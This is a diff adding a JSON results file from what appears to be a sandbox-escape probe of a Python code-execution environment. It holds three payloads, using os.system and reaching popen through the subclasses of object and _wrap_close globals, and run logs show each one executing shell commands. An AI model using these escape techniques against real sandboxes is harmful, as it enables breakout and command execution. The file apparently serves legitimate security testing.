@@ -1,0 +1,49 @@
+{
+  "probe": "P12",
+  "config": "default",
+  "codes": [
+    "subs = ().__class__.__base__.__subclasses__()\nnames = [c.__name__ for c in subs]\nmsg = 'SUBS ' + str(len(subs)) + ' ' + str('_wrap_close' in names) + ' ' + str('Popen' in names)\nprint(msg)\nmsg",
+    "msg = \"SYSTEM \" + str(__import__(\"os\").system(\"echo PWNED\"))\nprint(msg)\nmsg",
+    "wc = [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == '_wrap_close']\nmsg = 'WRAP ' + wc[0].__init__.__globals__['popen']('echo PWNED2').read()\nprint(msg)\nmsg"
+  ],
+  "runs": [
+    {
+      "ok": true,
+      "stdout": "SUBS 1539 True True",
+      "stderr": "",
+      "result": "'SUBS 1539 True True'",
+      "error": null,
+      "interrupted": false,
+      "ms": 2.7,
+      "started": 1795377185.997105
+    },
+    {
+      "ok": true,
+      "stdout": "SYSTEM 0",
+      "stderr": "",
+      "result": "'SYSTEM 0'",
+      "error": null,
+      "interrupted": false,
+      "ms": 4.7,
+      "started": 1795377185.999966
+    },
+    {
+      "ok": true,
+      "stdout": "WRAP PWNED2\n",
+      "stderr": "",
+      "result": "'WRAP PWNED2\\n'",
+      "error": null,
+      "interrupted": false,
+      "ms": 7.4,
+      "started": 1795377186.004895
+    }
+  ],
+  "setup_ms": 298.6,
+  "done": true,
+  "killed": null,
+  "exit_code": 0,
+  "wall_s": 1.0,
+  "peak_tree_rss_gb": 0.165,
+  "calls": [],
+  "child_log_tail": "[11/22/26 14:53:05] INFO     Generating MCP bindings to            codegen.py:62\n                             /var/folders/tg/x0gcvxzs2ks8jyz23g3pg              \n                             dpw0000gn/T/dl-eval-_gt3mmdm/generate              \n                             d (mcp dir:                                        \n                             /var/folders/tg/x0gcvxzs2ks8jyz23g3pg              \n                             dpw0000gn/T/dl-eval-_gt3mmdm/generate              \n                             d/mcp)                                             \n                    INFO     Generating bindings for server        codegen.py:73\n                             'probe' into                                       \n                             /var/folders/tg/x0gcvxzs2ks8jyz23g3pg              \n                             dpw0000gn/T/dl-eval-_gt3mmdm/generate              \n                             d/mcp/probe                                        \nPWNED\n"
+}
